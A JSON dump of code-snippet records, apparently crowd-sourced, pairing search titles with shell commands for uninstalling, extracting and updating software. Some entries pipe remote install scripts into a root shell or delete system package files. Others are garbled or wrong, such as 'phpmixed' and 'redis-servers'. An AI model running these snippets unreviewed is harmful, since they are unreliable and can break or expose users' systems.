    "reg_date": "2021-10-11T22:12:53.000Z"
  },
  {
    "id": 4779,
    "keyword": null,
    "link": null,
    "title": " uninstall node js and npm ubuntu",
    "description": "sudo apt-get purge --auto-remove nodejs\n",
    "reg_date": "2021-10-11T22:12:53.000Z"
  },
  {
    "id": 4780,
    "keyword": null,
    "link": null,
    "title": " uninstall opencv on anaconda ubuntu",
    "description": "pip uninstall opencv-python pip uninstall opencv-contrib-python\n",
    "reg_date": "2021-10-11T22:12:53.000Z"
  },
  {
    "id": 4781,
    "keyword": null,
    "link": null,
    "title": " uninstall packages linux terminal",
    "description": "$ sudo apt-get --purge remove {PACKAGE_NAME}\nsudo apt-get remove [pkg]\n",
    "reg_date": "2021-10-11T22:12:54.000Z"
  },
  {
    "id": 4782,
    "keyword": null,
    "link": null,
    "title": " uninstall packages raspberry pi terminal",
    "description": "$ sudo apt-get --purge remove {PACKAGE_NAME}\n",
    "reg_date": "2021-10-11T22:12:54.000Z"
  },
  {
    "id": 4783,
    "keyword": null,
    "link": null,
    "title": " uninstall phpmyadmin completely ubuntu",
    "description": "#remove phpmyadmin #1 sudo apt-get purge phpmyadmin or sudo apt-get remove phpmyadmin #2 sudo apt-get autoremove\nsudo apt-get purge phpmyadmin\nsudo rm -r /var/lib/dpkg/info/phpmyadmin.* \\ && sudo apt-get clean \\ && sudo apt-get update \\ && sudo apt-get remove phpmyadmin \\ && sudo apt-get purge phpmyadmin  sudo apt-get update \\ sudo apt-get -f install \\ sudo apt autoremove\n",
    "reg_date": "2021-10-11T22:12:54.000Z"
  },
  {
    "id": 4784,
    "keyword": null,
    "link": null,
    "title": " uninstall pyqt5",
    "description": "pip3 uninstall pyqt5 \n",
    "reg_date": "2021-10-11T22:12:54.000Z"
  },
  {
    "id": 4785,
    "keyword": null,
    "link": null,
    "title": " uninstall qt creator ubuntu",
    "description": "sudo apt-get remove --auto-remove qtcreator\n",
    "reg_date": "2021-10-11T22:12:54.000Z"
  },
  {
    "id": 4786,
    "keyword": null,
    "link": null,
    "title": " uninstall redis ubuntu terminal",
    "description": "apt-get purge --auto-remove redis-servers # check if the package is present or not apt-cache policy redis-server \n",
    "reg_date": "2021-10-11T22:12:54.000Z"
  },
  {
    "id": 4787,
    "keyword": null,
    "link": null,
    "title": " uninstall scikit learn",
    "description": "pip uninstall sklearn --yes \n",
    "reg_date": "2021-10-11T22:12:54.000Z"
  },
  {
    "id": 4788,
    "keyword": null,
    "link": null,
    "title": " uninstall skype from ubuntu",
    "description": "sudo apt-get --purge remove skypeforlinux\n",
    "reg_date": "2021-10-11T22:12:55.000Z"
  },
  {
    "id": 4789,
    "keyword": null,
    "link": null,
    "title": " uninstall space vim",
    "description": "curl -sLf https://spacevim.org/install.sh | bash -s -- --uninstall\n",
    "reg_date": "2021-10-11T22:12:55.000Z"
  },
  {
    "id": 4790,
    "keyword": null,
    "link": null,
    "title": " uninstall tensorflow",
    "description": "sudo pip uninstall tensorflow\n",
    "reg_date": "2021-10-11T22:12:55.000Z"
  },
  {
    "id": 4791,
    "keyword": null,
    "link": null,
    "title": " uninstall visual paradigm ubuntu",
    "description": "//check in the terminal if there is a package that starts with 'visual' dpkg-query -l 'Visual*'  //if yes dpkg -r [package name]  //if no.  cd /opt sudo rm -R [visual_paradigm_directory_name]  Then check your homedirectory for a directory called &ldquo;VisualParadigm&rdquo; (default name). This will contain your so called workspace as well as several data files which Visual Paradigm uses (license files, log files, etc.). If you want to save some of your Visual Paradigm projects then this is where you&rsquo;ll find them (most likely: ~/VisualParadigm/ws/VPProjects).  If you&rsquo;re fully sure about not needing to save any data then also remove this directory (\"~/VisualParadigm\").\n",
    "reg_date": "2021-10-11T22:12:55.000Z"
  },
  {
    "id": 4792,
    "keyword": null,
    "link": null,
    "title": " uninstall visual studio code ubuntu",
    "description": "sudo dpkg --remove visual-studio-code \nsudo dpkg --purge code  sudo dpkg --remove code  move/delete the folders ~/.config/Code and ~/.vscode\nsudo apt purge code \n",
    "reg_date": "2021-10-11T22:12:55.000Z"
  },
  {
    "id": 4793,
    "keyword": null,
    "link": null,
    "title": " uninstall vmware in ubuntu",
    "description": "sudo  vmware-installer -u vmware-workstation #install workstation including player\n",
    "reg_date": "2021-10-11T22:12:55.000Z"
  },
  {
    "id": 4794,
    "keyword": null,
    "link": null,
    "title": " uninstall vmware workstation",
    "description": "sudo vmware-installer -u vmware-workstation\n",
    "reg_date": "2021-10-11T22:12:55.000Z"
  },
  {
    "id": 4795,
    "keyword": null,
    "link": null,
    "title": " uninstall vmware workstation 16 ubuntu",
    "description": "Show what is currently installed (list products): sudo /usr/bin/vmware-installer -l  sudo /usr/bin/vmware-installer -u [vmware-player or vmware-workstation]\nsudo  vmware-installer -u vmware-workstation #install workstation including player\n",
    "reg_date": "2021-10-11T22:12:55.000Z"
  },
  {
    "id": 4796,
    "keyword": null,
    "link": null,
    "title": " uninstall vmware workstation ubuntu",
    "description": "Show what is currently installed (list products): sudo /usr/bin/vmware-installer -l  sudo /usr/bin/vmware-installer -u [vmware-player or vmware-workstation]\nsudo  vmware-installer -u vmware-workstation #install workstation including player\nsudo vmware-installer -u vmware-workstation\n",
    "reg_date": "2021-10-11T22:12:56.000Z"
  },
  {
    "id": 4797,
    "keyword": null,
    "link": null,
    "title": " uninstall vscode linux",
    "description": "sudo dpkg --purge code  sudo dpkg --remove code  move/delete the folders ~/.config/Code and ~/.vscode\nsudo apt purge code \n",
    "reg_date": "2021-10-11T22:12:56.000Z"
  },
  {
    "id": 4798,
    "keyword": null,
    "link": null,
    "title": " uninstall vscode ubuntu",
    "description": "sudo dpkg --remove visual-studio-code \nsudo dpkg --purge code  sudo dpkg --remove code  move/delete the folders ~/.config/Code and ~/.vscode\nsudo apt purge code \n",
    "reg_date": "2021-10-11T22:12:56.000Z"
  },
  {
    "id": 4799,
    "keyword": null,
    "link": null,
    "title": " uninstall vue from my system",
    "description": "npm uninstall -g @vue/cli  #or  yarn global remove @vue/cli\n",
    "reg_date": "2021-10-11T22:12:56.000Z"
  },
  {
    "id": 4800,
    "keyword": null,
    "link": null,
    "title": " uninstall webpack globally",
    "description": "npm uninstall -g webpack npm uninstall webpack\nnpm uninstall sax \n",
    "reg_date": "2021-10-11T22:12:56.000Z"
  },
  {
    "id": 4801,
    "keyword": null,
    "link": null,
    "title": " uninstall wine ubuntu 18.04",
    "description": "sudo apt autoremove wine-devel wine-devel-amd64 wine-devel-i386 winehq-devel winetricks \nsudo apt install wine-stable \n",
    "reg_date": "2021-10-11T22:12:56.000Z"
  },
  {
    "id": 4802,
    "keyword": null,
    "link": null,
    "title": " uninstall winetricks ubuntu",
    "description": "sudo apt-get remove winetricks\n",
    "reg_date": "2021-10-11T22:12:56.000Z"
  },
  {
    "id": 4803,
    "keyword": null,
    "link": null,
    "title": " uninstall wps office",
    "description": "sudo apt-get purge wps-office   # for a8 or earlier versions. sudo apt-get purge kingsoft-office  # for a9 or later versions.\n",
    "reg_date": "2021-10-11T22:12:57.000Z"
  },
  {
    "id": 4804,
    "keyword": null,
    "link": null,
    "title": " uninstall wps office ubuntu",
    "description": "sudo apt-get purge wps-office   # for a8 or earlier versions. sudo apt-get purge kingsoft-office  # for a9 or later versions.\nsudo apt-get remove wps-office\n",
    "reg_date": "2021-10-11T22:12:57.000Z"
  },
  {
    "id": 4805,
    "keyword": null,
    "link": null,
    "title": " uninstalling eclipse from ubuntu",
    "description": "sudo apt-get autoremove eclipse* rm -r ~/.eclipse/ \n",
    "reg_date": "2021-10-11T22:12:57.000Z"
  },
  {
    "id": 4806,
    "keyword": null,
    "link": null,
    "title": " unisntall libaary laravel",
    "description": "composer remove vendor/package\n",
    "reg_date": "2021-10-11T22:12:57.000Z"
  },
  {
    "id": 4807,
    "keyword": null,
    "link": null,
    "title": " unistall pods",
    "description": "$ sudo gem install cocoapods-clean $ pod deintegrate $ pod clean $ pod install\n",
    "reg_date": "2021-10-11T22:12:57.000Z"
  },
  {
    "id": 4808,
    "keyword": null,
    "link": null,
    "title": " unity get scroll",
    "description": "using System.Collections; using System.Collections.Generic; using UnityEngine;  // Input.mouseScrollDelta example // // Create a sphere moved by a mouse scrollwheel or two-finger // slide on a Mac trackpad.  public class ExampleClass : MonoBehaviour {     private Transform sphere;     private float scale;      void Awake()     {         GameObject go = GameObject.CreatePrimitive(PrimitiveType.Sphere);         sphere = go.transform;          // create a yellow quad         go = GameObject.CreatePrimitive(PrimitiveType.Quad);         go.transform.Rotate(new Vector3(90.0f, 0.0f, 0.0f));         go.transform.localScale = new Vector3(4.0f, 4.0f, 4.0f);         go.GetComponent<Renderer>().material.color = new Color(0.75f, 0.75f, 0.0f, 0.5f);          // change the camera color and position         Camera.main.clearFlags = CameraClearFlags.SolidColor;         Camera.main.transform.position = new Vector3(2, 1, 5);         Camera.main.transform.Rotate(0, -160, 0);          scale = 0.1f;     }      void OnGUI()     {         Vector3 pos = sphere.position;         pos.y += Input.mouseScrollDelta.y * scale;         sphere.position = pos;     } }\n",
    "reg_date": "2021-10-11T22:12:58.000Z"
  },
  {
    "id": 4809,
    "keyword": null,
    "link": null,
    "title": " unity gitignore",
    "description": "# This .gitignore file should be placed at the root of your Unity project directory # # Get latest from https://github.com/github/gitignore/blob/master/Unity.gitignore # /[Ll]ibrary/ /[Tt]emp/ /[Oo]bj/ /[Bb]uild/ /[Bb]uilds/ /[Ll]ogs/ /[Uu]ser[Ss]ettings/  # MemoryCaptures can get excessive in size. # They also could contain extremely sensitive data /[Mm]emoryCaptures/  # Asset meta data should only be ignored when the corresponding asset is also ignored !/[Aa]ssets/**/*.meta  # Uncomment this line if you wish to ignore the asset store tools plugin # /[Aa]ssets/AssetStoreTools*  # Autogenerated Jetbrains Rider plugin /[Aa]ssets/Plugins/Editor/JetBrains*  # Visual Studio cache directory .vs/  # Gradle cache directory .gradle/  # Autogenerated VS/MD/Consulo solution and project files ExportedObj/ .consulo/ *.csproj *.unityproj *.sln *.suo *.tmp *.user *.userprefs *.pidb *.booproj *.svd *.pdb *.mdb *.opendb *.VC.db  # Unity3D generated meta files *.pidb.meta *.pdb.meta *.mdb.meta  # Unity3D generated file on crash reports sysinfo.txt  # Builds *.apk *.aab *.unitypackage  # Crashlytics generated file crashlytics-build.properties  # Packed Addressables /[Aa]ssets/[Aa]ddressable[Aa]ssets[Dd]ata/*/*.bin*  # Temporary auto-generated Android Assets /[Aa]ssets/[Ss]treamingAssets/aa.meta /[Aa]ssets/[Ss]treamingAssets/aa/*\n",
    "reg_date": "2021-10-11T22:12:58.000Z"
  },
  {
    "id": 4810,
    "keyword": null,
    "link": null,
    "title": " unity logcat",
    "description": " adb logcat -s Unity DEBUG\n",
    "reg_date": "2021-10-11T22:12:58.000Z"
  },
  {
    "id": 4811,
    "keyword": null,
    "link": null,
    "title": " unix if directory",
    "description": "if [ -d \"$DIRECTORY\" ]; then   # Control will enter here if $DIRECTORY exists. fi\n",
    "reg_date": "2021-10-11T22:12:58.000Z"
  },
  {
    "id": 4812,
    "keyword": null,
    "link": null,
    "title": " unix print environment variable",
    "description": "printenv\nENV_VAR=\"hello world\" printenv ENV_VAR\n",
    "reg_date": "2021-10-11T22:12:58.000Z"
  },
  {
    "id": 4813,
    "keyword": null,
    "link": null,
    "title": " unix replace comma with tab",
    "description": "sed 's/\\,/\\t/g' file.csv  > file.txt\n",
    "reg_date": "2021-10-11T22:12:58.000Z"
  },
  {
    "id": 4814,
    "keyword": null,
    "link": null,
    "title": " unknown shorthand flag: 'd' in -daemon+docker stop",
    "description": "docker rm $(docker ps -a -q) \ndocker rm $(docker ps -q -f status=exited) \n",
    "reg_date": "2021-10-11T22:12:58.000Z"
  },
  {
    "id": 4815,
    "keyword": null,
    "link": null,
    "title": " unknown type name 'CDVUIWebViewDelegate'     CDVUIWebViewDelegate*  webViewDelegate;",
    "description": "cordova plugin rm cordova-plugin-inappbrowser\n",
    "reg_date": "2021-10-11T22:12:58.000Z"
  },
  {
    "id": 4816,
    "keyword": null,
    "link": null,
    "title": " unstage previous commit",
    "description": "git reset --soft HEAD~1  Should do what you want. After this,  you will have the first changes in the index (visible with git diff --cached),  and your newest changes not staged. git status will then look like this:  # On branch master # Changes to be committed: #   (use \"git reset HEAD <file>...\" to unstage) # #       modified:   foo.java # # Changes not staged for commit: #   (use \"git add <file>...\" to update what will be committed) #   (use \"git checkout -- <file>...\" to discard changes in working directory) # #       modified:   foo.java  You can then do git add foo.java and commit both changes at once.\n",
    "reg_date": "2021-10-11T22:12:59.000Z"
  },
  {
    "id": 4817,
    "keyword": null,
    "link": null,
    "title": " untar .tar file",
    "description": "tar -zxvf file_name.tar.gz\ntar -xvf yourfile.tar\ntar -zvxf documents.tgz -C path/to/directory/\n",
    "reg_date": "2021-10-11T22:12:59.000Z"
  },
  {
    "id": 4818,
    "keyword": null,
    "link": null,
    "title": " untar a file",
    "description": "# if it is a .tar.gz file  tar -zxvf file_name.tar.gz\ntar -xvf filename.tar\n## Untar files in Current Directory ## tar -xvf filename.tar.gz  ## Untar files in specified Directory ## tar -xvf filename.tar.gz -C /path_name_for_unzip/  -x : extract -C : specified directory -v : Verbosely show the .tar file progress. -f : filename of archive file\ntar -xvf yourfile.tar.gz\ntar -xvf yourfile.tar\ntar -xvf file.tar etc/resolv.conf tar -xzvf file.tar.gz etc/resolv.conf tar -xjvf file.tar.bz2 etc/resolv.conf  #Extract files into a specific folder tar -xf archive.tar.gz -C /home/linuxize/files \n",
    "reg_date": "2021-10-11T22:12:59.000Z"
  },
  {
    "id": 4819,
    "keyword": null,
    "link": null,
    "title": " untar file in linux",
    "description": "tar -xvf yourfile.tar.gz\n$ tar -xvf <tar_archive> <filename>\ntar -xvf file.tar etc/resolv.conf tar -xzvf file.tar.gz etc/resolv.conf tar -xjvf file.tar.bz2 etc/resolv.conf  #Extract files into a specific folder tar -xf archive.tar.gz -C /home/linuxize/files \n",
    "reg_date": "2021-10-11T22:12:59.000Z"
  },
  {
    "id": 4820,
    "keyword": null,
    "link": null,
    "title": " untar tar.gz",
    "description": "# Basic syntax: tar -zxvf file.tar.gz  # Where: #\t- x tells tar to extract the files #\t- v tells the command to list all of the files in the archive #\t- z tells the tar command to uncompress the file (gzip) #\t- f tells tar that you are going to give it a file name to work with\n tar xvzf file.tar.gz\ntar -xvf file.tar.gz\ntar -xvf yourfile.tar.gz\ntar -xzf file.tar.gz\ntar -zxvf file_name.tar.gz\n",
    "reg_date": "2021-10-11T22:12:59.000Z"
  },
  {
    "id": 4821,
    "keyword": null,
    "link": null,
    "title": " untar xz",
    "description": "tar -xf file.tar.xz\ntar -xf filename.tar.xz\n",
    "reg_date": "2021-10-11T22:12:59.000Z"
  },
  {
    "id": 4822,
    "keyword": null,
    "link": null,
    "title": " unzip  caution: filename not matched",
    "description": "# use '-d', as follow: unzip ./1603098001.zip -d ./test\n",
    "reg_date": "2021-10-11T22:12:59.000Z"
  },
  {
    "id": 4823,
    "keyword": null,
    "link": null,
    "title": " unzip a .gz file in linux",
    "description": "gunzip file.gz \nUnzip a . GZ file by typing \"gunzip\" into the \"Terminal\" window\n",
    "reg_date": "2021-10-11T22:12:59.000Z"
  },
  {
    "id": 4824,
    "keyword": null,
    "link": null,
    "title": " unzip a tar.gz file in linux",
    "description": "# Basic syntax: tar -zxvf file.tar.gz  # Where: #\t- x tells tar to extract the files #\t- v tells the command to list all of the files in the archive #\t- z tells the tar command to uncompress the file (gzip) #\t- f tells tar that you are going to give it a file name to work with\ntar -xvf yourfile.tar.gz\ntar -xvzf community_images.tar.gz\ntar xvzf file.tar.gz\nUnzip a . GZ file by typing \"gunzip\" into the \"Terminal\" window\n",
    "reg_date": "2021-10-11T22:13:00.000Z"
  },
  {
    "id": 4825,
    "keyword": null,
    "link": null,
    "title": " unzip centos",
    "description": "$ sudo yum makecache $ sudo yum install unzip $ unzip app.zip\n",
    "reg_date": "2021-10-11T22:13:00.000Z"
  },
  {
    "id": 4826,
    "keyword": null,
    "link": null,
    "title": " unzip command in ubuntu",
    "description": "// install sudo apt install zip unzip  // zip zip -r example.zip original_folder  // unzip unzip file.zip -d destination_folder\nZip-unzip utility: sudo apt-get install zip unzip navigate to the place where the zip belongs and, unzip test.zip, where test.zip is the zip file to extract\nsudo apt-get install unzip \nunzip file.zip -d destination_folder \napt-get install unzip \nunzip file.zip \n",
    "reg_date": "2021-10-11T22:13:00.000Z"
  },
  {
    "id": 4827,
    "keyword": null,
    "link": null,
    "title": " unzip folder linux",
    "description": "mkdir temp_for_zip_extract unzip /path/to/file.zip -d temp_for_zip_extract \nunzip file.zip -d destination_folder \nunzip file.zip -d destination_folder or unzip path/to/file.zip\n$ unzip tecmint_files.zip \nunzip package.zip -d /opt\nunzip /path/to/archive.zip \"in/archive/folder/*\" -d \"/path/to/unzip/to\" \n",
    "reg_date": "2021-10-11T22:13:00.000Z"
  },
  {
    "id": 4828,
    "keyword": null,
    "link": null,
    "title": " unzip into specific directory",
    "description": "mkdir temp_for_zip_extract unzip /path/to/file.zip -d temp_for_zip_extract \n",
    "reg_date": "2021-10-11T22:13:00.000Z"
  },
  {
    "id": 4829,
    "keyword": null,
    "link": null,
    "title": " unzip tar.bz2",
    "description": "tar -xf archive.tar.bz2\ntar -xvf file.tar.gz\n",
    "reg_date": "2021-10-11T22:13:00.000Z"
  },
  {
    "id": 4830,
    "keyword": null,
    "link": null,
    "title": " unzip tar.gz",
    "description": "# Basic syntax: tar -zxvf file.tar.gz  # Where: #\t- x tells tar to extract the files #\t- v tells the command to list all of the files in the archive #\t- z tells the tar command to uncompress the file (gzip) #\t- f tells tar that you are going to give it a file name to work with\ntar -xvf file.tar.gz\ntar -xvf yourfile.tar.gz\ntar -xzf file.tar.gz\ntar -zxvf file_name.tar.gz\ntar -xvzf community_images.tar.gz\n",
    "reg_date": "2021-10-11T22:13:00.000Z"
  },
  {
    "id": 4831,
    "keyword": null,
    "link": null,
    "title": " unzip tar.xz linux",
    "description": "tar -xf file.tar.xz\ntar -xf filename.tar.xz\ntar -xf archive.tar.xz -C /home/linuxize/files\n tar -xf filename  \ntar -xvf archive.tar.xz\ncompress : tar cfJ file.tar.xz myFile  decompress : tar -xJf file.tar.xz\n",
    "reg_date": "2021-10-11T22:13:00.000Z"
  },
  {
    "id": 4832,
    "keyword": null,
    "link": null,
    "title": " update all chocolatey packages",
    "description": "choco upgrade all\nchoco upgrade all choco upgrade all --except=\"'skype,conemu'\"\n",
    "reg_date": "2021-10-11T22:13:00.000Z"
  },
  {
    "id": 4833,
    "keyword": null,
    "link": null,
    "title": " update anaconda to current version",
    "description": "conda update --all \nconda update conda\n",
    "reg_date": "2021-10-11T22:13:01.000Z"
  },
  {
    "id": 4834,
    "keyword": null,
    "link": null,
    "title": " update angular cli globally",
    "description": "npm update @angular/cli -g\nnpm uninstall -g angular-cli npm install -g @angular/cli@latest \nnpm uninstall -g @angular-cli npm install -g @angular/cli@latest \nFor updating angular cli type this command : ng update @angular/cli @angular/core   \nnpm uninstall -g @angular-cli npm cache verify npm install -g @angular/cli@latest\n               content_copy              ng update @angular/cli @angular/core     \n",
    "reg_date": "2021-10-11T22:13:01.000Z"
  },
  {
    "id": 4835,
    "keyword": null,
    "link": null,
    "title": " update cocoapods version mac",
    "description": "##CocoaPods manages library dependencies for your Xcode projects. #install the latest stable version of cocoapods $ sudo gem install cocoapods  #Update pod  $ pod setup  #pod version $ pod --version\npod --version\n",
    "reg_date": "2021-10-11T22:13:01.000Z"
  },
  {
    "id": 4836,
    "keyword": null,
    "link": null,
    "title": " update composer globally",
    "description": "composer self-update \n",
    "reg_date": "2021-10-11T22:13:01.000Z"
  },
  {
    "id": 4837,
    "keyword": null,
    "link": null,
    "title": " update composer on windows",
    "description": "composer self-update\nphp composer.phar self-update\n To update composer command just find location of composer.phar and update as:  where composer \t#Retrieves you location of your composer.phar  cd path_to_composer.phar #Move to directory with composer.phar  php composer.phar self-update\t#Update your composer\n",
    "reg_date": "2021-10-11T22:13:01.000Z"
  },
  {
    "id": 4838,
    "keyword": null,
    "link": null,
    "title": " update composer ubuntu",
    "description": "##update composer in ubuntu #update packages sudo apt-get update #if you don't have curl install it sudo apt-get install curl #download installer sudo curl -s https://getcomposer.org/installer | php #move composer.phar file sudo mv composer.phar /usr/local/bin/composer #check composer version composer -v\nyou need to first remove the composer  ->sudo apt-get remove composer   and then type the below command to install composer globally    ->sudo php composer-setup.php --install-dir=/usr/local/bin --filename=composer  for more info : click on the link below\nphp -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\" php -r \"if (hash_file('sha384', 'composer-setup.php') === '8a6138e2a05a8c28539c9f0fb361159823655d7ad2deecb371b04a83966c61223adc522b0189079e3e9e277cd72b8897') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;\" php composer-setup.php php -r \"unlink('composer-setup.php');\"\nphp -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"\nsudo curl -s https://getcomposer.org/installer | phpmixed\n#Ubuntu-Download Composer and create a Phar (PHP Archive) file $ curl -s https://getcomposer.org/installer | php  #Move it to bin directory $ sudo mv composer.phar /usr/local/bin/composer\n",
    "reg_date": "2021-10-11T22:13:01.000Z"
  },
  {
    "id": 4839,
    "keyword": null,
    "link": null,
    "title": " update cypress",
    "description": "npm install --save-dev cypress@4.11.0    //replace the version that you want  //yarn yarn upgrade cypress@4.11.0\nnpm install cypress or npm install cypress --save-dev // Make sure that you have already run npm init  ./node_modules/.bin/cypress open  //to open cypress window, will take 30 secs\n./node_modules/.bin/cypress open\n./node_modules/.bin/cypress open   // just cypress open wont work\n./node_modules/.bin/cypress run   // just cypress run wont work\nI think you're looking for --spec path/to/folder/*.js  You can run all the tests in a folder, or even in all subfolders of a folder  example:  --spec cypresss/integration/subsetA/**/*.js would run all .js files in all folders under the \"subsetA\" folder in cypress/integration. \n",
    "reg_date": "2021-10-11T22:13:01.000Z"
  },
  {
    "id": 4840,
    "keyword": null,
    "link": null,
    "title": " update flutter",
    "description": "flutter upgrade\n$ flutter channel \nI want to upgrade most latest version. So I used below commands:  flutter channel dev  Flutter has 4 project branches / channels ie stable, master, dev, beta. First  when we install it. flutter install stable channel. If you want to switch :  flutter channel chanel_name  Then donwload that :  flutter upgrade\n$ flutter upgrade  Flutter 0.5.1 &bull; channel beta &bull; https://github.com/flutter/flutter.git Framework &bull; revision c7ea3ca377 (9 weeks ago) &bull; 2018-05-29 21:07:33 +0200 Engine &bull; revision 1ed25ca7b7 Tools &bull; Dart 2.0.0-dev.58.0.flutter-f981f09760 \n",
    "reg_date": "2021-10-11T22:13:02.000Z"
  },
  {
    "id": 4841,
    "keyword": null,
    "link": null,
    "title": " update fork repository",
    "description": "## Add Original Repository git remote add upstream https://github.com/OriginalOwner/OriginalProject.git  ## Verify if Repository is added git remote -v  ## Fetch Updates from Original Repository git fetch upstream  ## Checkout to your master branch git checkout master  ## Get Updates from upstream repo git merge upstream/master  ## Push the commit over  git push origin master\n# Add the remote, call it \"upstream\":  git remote add upstream https://github.com/whoever/whatever.git  # Fetch all the branches of that remote into remote-tracking branches, # such as upstream/master:  git fetch upstream  # Make sure that you're on your master branch:  git checkout master  # Rewrite your master branch so that any commits of yours that # aren't already in upstream/master are replayed on top of that # other branch:  git rebase upstream/master\ngit fetch upstream  git checkout master  git merge upstream/master  git push origin\n",
    "reg_date": "2021-10-11T22:13:02.000Z"
  },
  {
    "id": 4842,
    "keyword": null,
    "link": null,
    "title": " update git repo local",
    "description": "git pull origin master \n",
    "reg_date": "2021-10-11T22:13:02.000Z"
  },
  {
    "id": 4843,
    "keyword": null,
    "link": null,
    "title": " update git version in ubuntu",
    "description": "sudo add-apt-repository ppa:git-core/ppa -y sudo apt-get update sudo apt-get install git -y git --version \napt-get update apt-get upgrade apt-get install git \n",
    "reg_date": "2021-10-11T22:13:02.000Z"
  },
  {
    "id": 4844,
    "keyword": null,
    "link": null,
    "title": " update global package npm",
    "description": "# you can check which packages are outdated by running npm outdated -g  # then you can update al of them or a specific one npm update -g # all npm update -g <package-name> # specific one\n",
    "reg_date": "2021-10-11T22:13:02.000Z"
  },
  {
    "id": 4845,
    "keyword": null,
    "link": null,
    "title": " update google chrome command ubuntu",
    "description": "sudo apt-get --only-upgrade install google-chrome-stable\n",
    "reg_date": "2021-10-11T22:13:02.000Z"
  },
  {
    "id": 4846,
    "keyword": null,
    "link": null,
    "title": " update grub archlinux",
    "description": "grub-mkconfig -o /boot/grub/grub.cfg\n",
    "reg_date": "2021-10-11T22:13:02.000Z"
  },
  {
    "id": 4847,
    "keyword": null,
    "link": null,
    "title": " update homestead after yaml change",
    "description": "vagrant reload --provision \n",
    "reg_date": "2021-10-11T22:13:03.000Z"
  },
  {
    "id": 4848,
    "keyword": null,
    "link": null,
    "title": " update index assume changed",
    "description": "$ git update-index --assume-unchanged path/to/file \ngit update-index --no-assume-unchanged path/to/file \n",
    "reg_date": "2021-10-11T22:13:03.000Z"
  },
  {
    "id": 4849,
    "keyword": null,
    "link": null,
    "title": " update java runtime ubuntu",
    "description": "sudo add-apt-repository ppa:webupd8team/java sudo apt-get update sudo apt-get install oracle-java7-installer \n",
    "reg_date": "2021-10-11T22:13:03.000Z"
  },
  {
    "id": 4850,
    "keyword": null,
    "link": null,
    "title": " update linux command",
    "description": "sudo apt update && sudo apt upgrade -y #or use it seperately sudo apt update sudo apt upgrade #you make wanna run below command to remove unwanted #and free up some space sudo apt autoremove\n# \"To update Linux type:\" sudo apt-get update  # To upgrade Linux sudo apt upgrade  # For Both sudo apt update && sudo apt upgrade -y\nsudo apt-get update && sudo apt-get upgrade\n# \"To update Linux type:\" sudo apt-get update # Enter your user's password.\n# Upgrades all applications sudo apt-get upgrade \nsudo apt-get update sudo apt-get upgrade sudo apt-get dist-upgrade \n",
    "reg_date": "2021-10-11T22:13:03.000Z"
  },
  {
    "id": 4851,
    "keyword": null,
    "link": null,
    "title": " update metsploit kali linux",
    "description": "First Try sudo apt-get remove metasploit-framework then, sudo apt  update ; sudo apt install metasploit-framework or sudo msfupdate\nsudo apt install metasploit-framework msfupdate\n",
    "reg_date": "2021-10-11T22:13:03.000Z"
  },
  {
    "id": 4852,
    "keyword": null,
    "link": null,
    "title": " update my fork repository at github",
    "description": "## Add Original Repository git remote add upstream https://github.com/OriginalOwner/OriginalProject.git  ## Verify if Repository is added git remote -v  ## Fetch Updates from Original Repository git fetch upstream  ## Checkout to your master branch git checkout master  ## Get Updates from upstream repo git merge upstream/master  ## Push the commit over  git push origin master\n# Add the remote, call it \"upstream\":  git remote add upstream https://github.com/whoever/whatever.git  # Fetch all the branches of that remote into remote-tracking branches, # such as upstream/master:  git fetch upstream  # Make sure that you're on your master branch:  git checkout master  # Rewrite your master branch so that any commits of yours that # aren't already in upstream/master are replayed on top of that # other branch:  git rebase upstream/master\n",
    "reg_date": "2021-10-11T22:13:03.000Z"
  },
  {
    "id": 4853,
    "keyword": null,
    "link": null,
    "title": " update node js linux",
    "description": "//First, clear the npm cache: \tnpm cache clean -f  //Install n, Node&rsquo;s version manager: \tnpm install -g n      //With the n module installed, you can use it to: \tInstall the latest stable version: n stable \tInstall the latest release: n latest\nsudo npm install -g n sudo n lts node -v \nwget https://nodejs.org/dist/v12.13.1/node-v12.13.1-linux-x64.tar.xz\nsudo apt-get install xz-utils\ntar -C /usr/local &ndash;strip-components 1 -xJf node-v12.13.1-linux-x64.tar.xz\n",
    "reg_date": "2021-10-11T22:13:03.000Z"
  },
  {
    "id": 4854,
    "keyword": null,
    "link": null,
    "title": " update node version debian",
    "description": "sudo npm cache clean -f sudo npm install -g n curl -sL https://deb.nodesource.com/setup_current.x | sudo bash - sudo apt-get install nodejs\n//First, clear the npm cache: \tnpm cache clean -f  //Install n, Node&rsquo;s version manager: \tnpm install -g n      //With the n module installed, you can use it to: \tInstall the latest stable version: n stable \tInstall the latest release: n latest\n",
    "reg_date": "2021-10-11T22:13:03.000Z"
  },
  {
    "id": 4855,
    "keyword": null,
    "link": null,
    "title": " update nodejs centos",
    "description": "$ curl -sL https://rpm.nodesource.com/setup_12.x | bash - sudo yum install nodejs\n",
    "reg_date": "2021-10-11T22:13:04.000Z"
  },
  {
    "id": 4856,
    "keyword": null,
    "link": null,
    "title": " update nodejs raspberry pi",
    "description": "sudo apt install nodejs\n",
    "reg_date": "2021-10-11T22:13:04.000Z"
  },
  {
    "id": 4857,
    "keyword": null,
    "link": null,
    "title": " update npm-windows",
    "description": "powershell Set-ExecutionPolicy RemoteSigned npm install -g npm-windows-upgrade npm-windows-upgrade\nnpm-windows-upgrade --npm-path \"C:\\nodejs\" \n",
    "reg_date": "2021-10-11T22:13:04.000Z"
  },
  {
    "id": 4858,
    "keyword": null,
    "link": null,
    "title": " update npm",
    "description": "// update npm// npm install -g npm@latest \nnpm install -g npm@latest #may require the use of sudo depending on your distro sudo npm install -g npm@latest\n// update npm to latest version // npm install -g npm@latest\nnpm install -g npm@latest  // for global install\t\t\n// update node package manager npm install -g npm@latest // -g = global // npm@latest = latest version\nnpm config get prefix -g\n",
    "reg_date": "2021-10-11T22:13:04.000Z"
  },
  {
    "id": 4859,
    "keyword": null,
    "link": null,
    "title": " update npm version ubuntu",
    "description": "sudo npm install npm@latest -g\n// update latest version NPM sudo npm install -g npm@latest  //update to next version NPM sudo npm install -g npm@next\n",
    "reg_date": "2021-10-11T22:13:04.000Z"
  },
  {
    "id": 4860,
    "keyword": null,
    "link": null,
    "title": " update npm with nvm",
